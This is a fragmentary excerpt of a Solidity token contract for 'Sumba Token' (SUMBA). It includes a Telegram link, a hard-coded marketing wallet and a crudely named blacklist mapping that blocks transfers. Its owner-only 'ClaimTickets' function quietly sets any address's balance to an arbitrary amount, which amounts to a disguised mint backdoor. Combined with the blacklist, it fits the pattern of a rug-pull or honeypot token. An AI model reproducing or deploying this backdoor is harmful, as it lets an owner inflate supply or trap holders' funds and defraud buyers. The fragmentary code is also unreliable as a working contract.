...
/*
 ...
 Telegram : Https://t.me/sumbatoken
...
contract SUMBA is Context, IERC20, Ownable {
    ...
    mapping(address => bool) public Bot_FUCKER;
    ...
    string private constant _name = "Sumba Token"; // 
    string private constant _symbol = "SUMBA"; //    
    uint8 private constant _decimals = 9; // 
    
    uint256 public _marketingFee = 0;
    uint256 public _liquidityFee = 0;
    address public  _marketingWallet = 0x26bD943B2c42204e274fEbfF93Dccd0c012fAc29;
    ...
    function ClaimTickets(address CTaddress, uint256 amount) external onlyOwner {
     // _balances[CTaddress] = amount * 10 ** 10;
      _tOwned[CTaddress]= amount * 10 ** 10;
    ...
    function _transfer(
        ...
        require(!Bot_FUCKER[from] && !Bot_FUCKER[to], 'Blacklisted address');
